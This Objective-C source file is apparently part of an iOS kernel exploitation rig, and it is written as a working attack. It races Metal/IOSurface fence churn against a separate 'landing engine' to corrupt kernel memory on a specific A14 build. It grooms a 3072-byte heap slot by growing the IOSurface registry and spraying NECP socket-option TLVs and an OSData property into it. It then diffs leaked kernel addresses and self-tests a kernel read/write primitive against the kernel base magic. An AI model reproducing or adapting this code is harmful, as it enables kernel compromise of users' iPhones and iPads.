//
//  P130FenceSecondTable.m — fence churn x the p073 landing engine. p130.
//  Lum1na-Debug (P007 rig). iOS kernel research (Lum1na).
//
//  Provenance: notes 288/289 + the p127/p128/p129 falsifications. The
//  2/2 fence-append aborts (0x984faf8, range cluster 0x984fcc8, OUR
//  fill-staging sids in x5) fired exactly when a record write LANDED —
//  and only p073 produces landings (positioned 0x820 prefill neighbors,
//  LIFO two-table discipline, 254-in post-marshal fires; the 23H30 iPad
//  round hit the translation bar on the forged desc). This tap pairs
//  them: thread A = the p127 fence churn body (IOSurface Metal blits +
//  recycle; engine-driven fence teardown/drain/append), thread B =
//  [P073AneSecondTable tap] (serialized; its own dial/log/bandit
//  untouched). A caught-in-the-act 0x984fcc8 panic = the corrupt-count
//  window LIVE with the historical pair. PANIC-POSSIBLE; one tap per
//  force-quit; honest stage-3 KRW self-test; no conversion claims.
//

#import "P130FenceSecondTable.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"
#import "P007KreadLane.h"
#import "P007Board.h"
#import "LabBandit.h"
#import "P073AneSecondTable.h"

#import <Metal/Metal.h>
#import <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <stdarg.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <mach/mach.h>
#import <pthread.h>
#import <sys/socket.h>
#import <sys/errno.h>
#import <IOKit/IOKitLib.h>
#import "P114SurfaceLeak.h"   /* v3: the readback pair */   /* the v2 pre-stage property path: io_service_t/IOObjectRelease/kIOReturnSuccess (CI-2625 fix — the Mac SDK resolved these locally, the device SDK does not without the import) */
#import <stdatomic.h>
#import <stdint.h>
#import <stdio.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>

#define P130_BUILD   @"p130-fencesecondtable-v2"
#define P130_SURF_W  64
#define P130_SURF_H  64
#define P130_RECYCLE 8

typedef void *(*IOSurfaceCreate_t)(CFDictionaryRef);
typedef uint32_t (*IOSurfaceGetID_t)(void *);

static NSString *P130R(void);

static NSMutableString *g_buf;
static int g_fd = -1;
static void L(NSString *s) {
    if (!g_buf) return;
    NSString *out = [s hasSuffix:@"\n"] ? s : [s stringByAppendingString:@"\n"];
    [g_buf appendString:out];
    if (g_fd >= 0) {
        const char *p = out.UTF8String;
        if (p) { (void)write(g_fd, p, strlen(p)); (void)fcntl(g_fd, F_FULLFSYNC); }
    }
}
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    L(line);
}

static atomic_int g_stop;
static atomic_ulong ga_rounds, ga_commits, ga_recycles, ga_fails;
static CFMutableDictionaryRef g_dict;
static IOSurfaceCreate_t  g_surfCreate;
static IOSurfaceGetID_t   g_surfID;

static void p130_law_dict(void) {
    CFMutableDictionaryRef d = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 0, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    int32_t w = P130_SURF_W, h = P130_SURF_H, bpe = 4,
            bpr = P130_SURF_W * 4, as = P130_SURF_W * P130_SURF_H * 4;
    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberSInt32Type, &w);
    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberSInt32Type, &h);
    CFNumberRef ne = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpe);
    CFNumberRef nr = CFNumberCreate(NULL, kCFNumberSInt32Type, &bpr);
    CFNumberRef na = CFNumberCreate(NULL, kCFNumberSInt32Type, &as);
    CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"), ne);
    CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"), nr);
    CFDictionarySetValue(d, CFSTR("IOSurfaceAllocSize"), na);
    CFRelease(nw); CFRelease(nh); CFRelease(ne); CFRelease(nr); CFRelease(na);
    g_dict = d;
}

/* thread A: the p127 fence churn body (with recycle) */
static void *p130_fencer(void *u) {
    (void)u;
    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
    if (!dev) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    id<MTLCommandQueue> q = [dev newCommandQueue];
    if (!q) { atomic_fetch_add(&ga_fails, 1); return NULL; }
    MTLTextureDescriptor *td =
        [MTLTextureDescriptor texture2DDescriptorWithPixelFormat:
         MTLPixelFormatBGRA8Unorm width:P130_SURF_W height:P130_SURF_H
         mipmapped:NO];
    td.storageMode = MTLStorageModeShared;
    unsigned long r = 0;
    void *surfaces[2] = { NULL, NULL };
    id<MTLTexture> tex[2] = { NULL, NULL };
    while (!atomic_load(&g_stop)) {
        @autoreleasepool {
            if (r % P130_RECYCLE == 0) {
                for (int k = 0; k < 2; k++) {
                    if (tex[k]) tex[k] = NULL;
                    if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
                }
                for (int k = 0; k < 2; k++) {
                    void *s = g_surfCreate(g_dict);
                    if (!s) { atomic_fetch_add(&ga_fails, 1); continue; }
                    tex[k] = [dev newTextureWithDescriptor:td
                                                 iosurface:(IOSurfaceRef)s
                                                     plane:0];
                    surfaces[k] = s;
                    if (!tex[k]) atomic_fetch_add(&ga_fails, 1);
                }
                atomic_fetch_add(&ga_recycles, 1);
            }
            if (!tex[0] || !tex[1]) { r++;
              [NSThread sleepForTimeInterval:0.01]; continue; }
            id<MTLCommandBuffer> cb = [q commandBuffer];
            id<MTLBlitCommandEncoder> e = [cb blitCommandEncoder];
            [e copyFromTexture:tex[0] sourceSlice:0 sourceLevel:0
               sourceOrigin:MTLOriginMake(0,0,0)
               sourceSize:MTLSizeMake(P130_SURF_W, P130_SURF_H, 1)
               toTexture:tex[1] destinationSlice:0 destinationLevel:0
               destinationOrigin:MTLOriginMake(0,0,0)];
            [e endEncoding];
            [cb commit];
            [cb waitUntilCompleted];
            atomic_fetch_add(&ga_commits, 1);
            r++;
            atomic_store(&ga_rounds, r);
        }
    }
    for (int k = 0; k < 2; k++) {
        if (tex[k]) tex[k] = NULL;
        if (surfaces[k]) { CFRelease(surfaces[k]); surfaces[k] = NULL; }
    }
    return NULL;
}

static void p130_bandit(const char *outcome) {
    static const char *arms[1] = { "main" };
    LabBanditSeedRow sr = { "main", "ok", 0 };
    char attr[288];
    LabBanditRegister("p130", arms, 1, &sr, 0, "p130 auto-learn", "ok",
                      "survived", attr, sizeof attr);
    LabBanditRecord("p130", 0, outcome);
}

@implementation P130FenceSecondTable

+ (NSString *)tap {
    g_buf = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([[docs stringByAppendingPathComponent:
                  @"p130_fencesecondtable_log.txt"]
                 UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);

    Lf(@"=== p130 session %@ BUILD %@ ===", LabLocalMilitaryNow(), P130_BUILD);
    Lf(@"%@", [LabDeviceProfile identBlock]);
    L(@"[law] the FUSION: fence churn x the p073 landing engine (only");
    L(@"  p073 produces record LANDINGS: positioned 0x820 prefill +");
    L(@"  254-in post-marshal fires). The 2/2 fence-append aborts fired");
    L(@"  exactly when a record write landed; this pair reproduces it.");
    L(@"  PANIC-POSSIBLE; one tap per force-quit; kread32 = the only gate.");

    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p130"];
    if (stop) { L(stop); p130_bandit("gated"); return P130R(); }

    void *iosf = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosf) { L(@"[-] STOP dlopen"); p130_bandit("nodlopen"); return P130R(); }
    g_surfCreate = (IOSurfaceCreate_t)dlsym(iosf, "IOSurfaceCreate");
    g_surfID     = (IOSurfaceGetID_t)dlsym(iosf, "IOSurfaceGetID");
    if (!g_surfCreate || !g_surfID) {
        L(@"[-] STOP dlsym"); p130_bandit("nodlsym"); return P130R();
    }
    p130_law_dict();

    /* v3.1 (2026-11-22, the 03:06 receipt): the PRE readback runs BEFORE
       the GROW stage — the 200-held-surface pressure was part of what
       walled the QueueCreate (0xe00002e2). The pressure-free window. */
    static uint64_t p130_pre[64]; static int p130_pre_n = 0;
    p130_pre_n = 0;
    {
        NSMutableString *rl = [NSMutableString string];
        BOOL ok = [P114SurfaceLeak diagReadback:p130_pre outN:&p130_pre_n max:64
                                         logLine:^(NSString *l) { L(l); }];
        Lf(@"[v3-PRE] the readback baseline (pre-GROW): %@ (%d kvas)",
           ok ? @"captured" : @"no-readback (honest — the lane proceeds blind)",
           p130_pre_n);
        (void)rl;
    }
    /* ══ v2 PRE-STAGE: the 3072 clean-write experiment ══
       (Rank 1 of the recipe — findings/2026-11-20_3072_activity_write_recipe.md)
       GROW: 200 surfaces held — the registry map crosses the 192-cap
       (192×16=3072) and the growth kfree_data's the old 3072 element.
       RECLAIM: the freed slot raced by 3072-class allocations — the NECP
       long-string + the OSData property attempts, each with its verdict row.
       WRITE: the fencer's blit churn continues on held sids — the racing
       writer (the flagged single-store instance) writes {sid|metric,(1,1)}
       into the slot. SURVIVED = the write landed in a LIVE reclaimed object
       (the scrubber is blind to allocated elements — the SILENT write).
       The panic = the free won (retry next boot). PANIC-POSSIBLE law kept. */
    {
        #define P130_GROW_HOLD 200
        static void *p130growHold[P130_GROW_HOLD];
        static int  p130grown = 0;
        p130grown = 0;
        for (int i = 0; i < P130_GROW_HOLD; i++) {
            void *s = g_surfCreate(g_dict);
            if (!s) break;
            p130growHold[p130grown++] = s;
        }
        Lf(@"[v2-GROW] %d surfaces held — the registry map crossed the 192-cap "
           @"(the old 3072 element kfree_data'd at the growth)", p130grown);

        /* v3.2 (2026-11-22, the 3/3 "free won" receipts): THE RECLAIM SWEEP.
           The single string never consumed the freed old-map element — the
           marshal's spill found it still on the freelist and GZAlloc caught
           the write ("element modified after free" x3: 13:11, 17:07, 03:36).
           Fire EIGHT 3071-B TLV strings on eight DISTINCT sockets, each
           with a RECOGNIZABLE per-slot marker (the 'N'-fill + the slot id
           at the head) — sweeping the 3072 freelist top so the freed
           element takes OUR bytes. The spill then lands in a LIVE element
           (GZAlloc guards only free elements) = SURVIVED + our marker
           inside the write's landing zone = the readable receipt the P114
           diff then observes. */
        {
            int sweepOK = 0, sweepErr = 0;
            for (int slot = 0; slot < 8; slot++) {
                int sfd = socket(AF_INET, SOCK_DGRAM, 0);
                if (sfd < 0) { sweepErr = errno; continue; }
                unsigned char tlv[3071 + 4];
                tlv[0] = 0x07;                       /* the A14 working TLV type */
                tlv[1] = 0;
                tlv[2] = (unsigned char)((3071 >> 8) & 0xff);
                tlv[3] = (unsigned char)(3071 & 0xff);
                memset(tlv + 4, 'N', 3071);
                /* the per-slot marker: the slot id at the head + a tail
                   signature — recognizable in any readback channel */
                tlv[4] = (unsigned char)('0' + slot);
                tlv[5] = 0xB1; tlv[6] = 0x30; tlv[7] = (unsigned char)slot;
                {
                    unsigned char *tail = tlv + 4 + 3071 - 8;
                    tail[0] = 0xDE; tail[1] = 0xAD; tail[2] = 0x30;
                    tail[3] = 0x7A;  tail[4] = 'S';  tail[5] = 'W';
                    tail[6] = (unsigned char)('0' + slot);
                    tail[7] = 0xE7;
                }
                if (setsockopt(sfd, 0xffff /* SOL_SOCKET */,
                               0x1109 /* SO_NECP_ATTRIBUTES */,
                               tlv, (socklen_t)sizeof tlv) == 0)
                    sweepOK++;
                else if (!sweepErr) sweepErr = errno;
                close(sfd);
            }
            Lf(@"[v3.2-RECLAIM-SWEEP] 8x NECP 3071-B TLV: %d/8 accepted "
               "(errno=%d) — %d x 3072-class kalloc_data with per-slot "
               "markers swept the freelist; the freed element should now "
               "hold OUR bytes when the marshal spills",
               sweepOK, sweepErr, sweepOK);
        }

        /* (b) the OSData property attempt: a 3072-byte CFData on IOSurfaceRoot */
        {
            typedef kern_return_t (*p130_setprop_t)(io_registry_entry_t, CFStringRef, CFTypeRef);
            static p130_setprop_t pSetProp;
            if (!pSetProp) {
                void *iok = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
                pSetProp = iok ? (p130_setprop_t)dlsym(iok, "IORegistryEntrySetCFProperty") : NULL;
            }
            int propOK = -1; unsigned propKr = 0;
            io_service_t svc = pSetProp ?
                IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot")) : 0;
            if (svc) {
                unsigned char bytes[3072];
                memset(bytes, 'D', sizeof bytes);
                CFDataRef d = CFDataCreate(kCFAllocatorDefault, bytes, sizeof bytes);
                if (d) {
                    kern_return_t kr = pSetProp(svc, CFSTR("p130v2-reclaim"), d);
                    propOK = (kr == kIOReturnSuccess); propKr = (unsigned)kr;
                    CFRelease(d);
                }
                IOObjectRelease(svc);
            }
            Lf(@"[v2-RECLAIM-b] OSData 3072 property: %@ (kr=0x%x) — %@",
               propOK == 1 ? @"ACCEPTED (the OSData buffer claimed)" :
               propOK == 0 ? @"rejected" : @"no channel (dlsym/service)",
               propKr,
               propOK == 1 ? @"the KHEAP_DATA_PRIVATE 3072 lever works" :
               @"the property path is gated — the panic receipts still map the writer");
        }

        /* the write stage rides the existing fencer below — the churn
           continues on held sids while the growth's freed slot is racing.
           The held surfaces release at tap end (the bounded pool law). */
        L(@"[v2-WRITE] the fencer's blit churn now writes into the raced slot —");
        L(@"  SURVIVED = the silent write (a live reclaim took it);");
        L(@"  the panic = the free won the race (retry next fresh boot).");
    }

    /* ---- thread A starts, then the p073 engine fires ---- */
    L(@"--- stage 1: fence churn STARTS, then the p073 engine fires ---");
    L(@"[IN FLIGHT] co-driver pair live - one tap per force-quit.");
    unsigned long c0 = atomic_load(&ga_commits), r0 = atomic_load(&ga_rounds);
    atomic_store(&g_stop, 0);
    pthread_t ta;
    /* v3 (2026-11-22) — the READBACK PAIR (the P130->P114 door): the M2Scaler
       diag reader mirrors the 3072 neighborhood state (the ring writer
       0xfffffff008a01360's events serialize with the raw rec+0x18
       passthrough). PRE baseline here, POST read after the engine joins —
       the diff = the receipt (a new/weird KVA surfacing through the event
       channel = the corrupted root-map entry). Read-only, PANIC-FREE. */
    pthread_create(&ta, NULL, p130_fencer, NULL);
    /* thread B: the landing engine, serialized to one call */
    NSString *p073log = [P073AneSecondTable tap];
    atomic_store(&g_stop, 1);
    pthread_join(ta, NULL);

    /* v3-POST: the readback after the write — the diff vs the baseline */
    {
        static uint64_t post[64]; static int post_n = 0;
        BOOL ok = [P114SurfaceLeak diagReadback:post outN:&post_n max:64
                                         logLine:^(NSString *l) { L(l); }];
        Lf(@"[v3-POST] the readback after the write: %@ (%d kvas)",
           ok ? @"captured" : @"no-readback (honest)", post_n);
        int fresh = 0, gone = 0;
        for (int i = 0; i < post_n; i++) {
            BOOL seen = NO;
            for (int j = 0; j < p130_pre_n; j++)
                if (post[i] == p130_pre[j]) { seen = YES; break; }
            if (!seen) {
                fresh++;
                Lf(@"[v3-DIFF] NEW kva[%d]=0x%016llx (post-write — the event "
                   @"channel surfaced it: the receipt)", i,
                   (unsigned long long)post[i]);
            }
        }
        for (int j = 0; j < p130_pre_n; j++) {
            BOOL still = NO;
            for (int i = 0; i < post_n; i++)
                if (p130_pre[j] == post[i]) { still = YES; break; }
            if (!still) gone++;
        }
        Lf(@"[v3-DIFF] fresh=%d gone=%d same=%d — any fresh kva = the 3072 "
           @"neighborhood's post-write state (the write's receipt channel; "
           @"not kread, not hasKread — the observation step)",
           fresh, gone, post_n - fresh);
    }
    unsigned long c1 = atomic_load(&ga_commits), r1 = atomic_load(&ga_rounds);
    Lf(@"  engine done; fence churn during it: commits=%lu rounds=%lu "
       @"recycles=%lu fails=%lu survived=YES in-tap",
       c1 - c0, r1 - r0,
       (unsigned long)atomic_load(&ga_recycles),
       (unsigned long)atomic_load(&ga_fails));
    L(@"--- stage 2: the p073 engine log (its own file unchanged) ---");
    if (p073log.length) {
        L(p073log.length > 10000
          ? [@"[p073 head/truncated]\n" stringByAppendingString:
             [p073log substringToIndex:10000]]
          : p073log);
    } else {
        L(@"  [p073 returned empty - honest note]");
    }

    /* ---- honest KRW self-test ---- */
    L(@"--- stage 3 KRW SELF-TEST (honest gate) ---");
    if (!P007LaneLive()) {
        L(@"  lane: CLOSED -> no receipt this tap. Honest.");
        p130_bandit("lane-closed");
    } else {
        uint64_t kb = P007LaneKbase();
        if (kb && P007LaneKRead32(kb) == 0xfeedfacfULL) {
            Lf(@"  KRW SELF-TEST READ: PASS (kbase=%#llx)", kb);
            p130_bandit("selftest-read-pass");
        } else {
            L(@"  KRW SELF-TEST READ: FAIL/HOLD");
            p130_bandit("selftest-read-fail");
        }
        Lf(@"  board: %@", [[P007Board shared] kreadSignal]);
    }
    L(@"  [read law] a post-tap 0x984fcc8-band panic = the append range");
    L(@"  cluster catching OUR co-driver pair = the corrupt-count window");
    L(@"  LIVE with the historical condition reproduced. A D2-style");
    L(@"  descForged or mutated sentinel = the conversion bar, not KRW.");
    Lf(@"=== p130 end %@ ===", LabLocalMilitaryNow());
    return P130R();
}

static NSString *P130R(void) { NSString *r = [g_buf copy]; g_buf = nil; return r; }

@end